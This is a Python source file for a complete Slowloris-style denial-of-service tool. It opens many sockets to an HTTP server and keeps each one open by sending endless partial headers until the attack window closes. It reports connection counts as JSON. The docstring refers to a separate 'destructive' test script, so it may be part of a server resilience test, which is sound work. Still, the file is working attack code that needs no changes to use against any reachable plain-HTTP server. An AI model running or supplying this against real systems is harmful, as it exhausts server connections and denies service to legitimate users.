#!/usr/bin/env python3
"""
slowloris.py — minimal Slowloris-style slow-headers HTTP/1.1 attacker.

Reads no external config. All knobs are CLI args. Uses only stdlib so it
runs on any box without `pip install`.

Output: one JSON line on stdout when the attack window closes, containing:
    {
      "connections_opened": int,
      "connections_dropped": int,
      "iterations_total": int,
      "duration_seconds": float
    }

Exit code is 0 on a normal attack-window close. Non-zero only on
configuration errors (target URL unparseable, no permissions to open
sockets, etc.) — NOT on target-side errors. Target liveness is verified
by the caller (run-destructive-slowloris.sh) after this script exits.
"""

import argparse
import json
import random
import socket
import string
import sys
import time
from urllib.parse import urlparse


def open_slow_connection(host: str, port: int, path: str, timeout: float):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    # Send a request line + Host header, but NEVER the final CRLF CRLF
    # that terminates headers. The target should be holding this slot
    # waiting for more header bytes until its header-receive-timeout
    # evicts the connection.
    nonce = "".join(random.choices(string.ascii_lowercase, k=8))
    request_line = f"GET {path}?slow={nonce} HTTP/1.1\r\nHost: {host}\r\n"
    sock.sendall(request_line.encode("ascii"))
    return sock


def dribble_header(sock: socket.socket) -> bool:
    """Write one fake header line. Returns False if connection died."""
    try:
        nonce = "".join(random.choices(string.ascii_lowercase, k=12))
        sock.sendall(f"X-Slow-{nonce}: {nonce}\r\n".encode("ascii"))
        return True
    except (BrokenPipeError, ConnectionResetError, OSError):
        return False


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--base-url", required=True,
                   help="http://host:port — protocol must be http (no TLS)")
    p.add_argument("--path", default="/",
                   help="Request-target path (default: /)")
    p.add_argument("--connections", type=int, default=1000)
    p.add_argument("--header-delay-seconds", type=float, default=10.0,
                   help="Seconds between dribbled header lines per connection")
    p.add_argument("--attack-duration-seconds", type=float, default=120.0)
    p.add_argument("--socket-timeout-seconds", type=float, default=30.0)
    args = p.parse_args()

    parsed = urlparse(args.base_url)
    if parsed.scheme != "http":
        print(f"ERROR: only plain http supported (got: {parsed.scheme})",
              file=sys.stderr)
        return 2
    host = parsed.hostname
    port = parsed.port or 80
    if host is None:
        print("ERROR: base-url has no hostname", file=sys.stderr)
        return 2

    sockets: list[socket.socket] = []
    opened = 0
    for i in range(args.connections):
        try:
            sock = open_slow_connection(host, port, args.path,
                                        args.socket_timeout_seconds)
            sockets.append(sock)
            opened += 1
        except OSError as e:
            # Target rejected the connection, ran out of fds, etc.
            # Continue — the point is to see how many slots the target
            # gives us before refusing.
            print(f"connect[{i}]: {e}", file=sys.stderr)

    print(f"opened {opened}/{args.connections} slow connections",
          file=sys.stderr)

    start = time.monotonic()
    deadline = start + args.attack_duration_seconds
    iterations = 0
    while time.monotonic() < deadline and sockets:
        for sock in list(sockets):
            if not dribble_header(sock):
                sockets.remove(sock)
                try:
                    sock.close()
                except OSError:
                    pass
            iterations += 1
        time.sleep(args.header_delay_seconds)

    duration = time.monotonic() - start
    dropped = args.connections - len(sockets)

    for sock in sockets:
        try:
            sock.close()
        except OSError:
            pass

    json.dump({
        "connections_opened": opened,
        "connections_dropped": dropped,
        "iterations_total": iterations,
        "duration_seconds": duration,
    }, sys.stdout)
    sys.stdout.write("\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
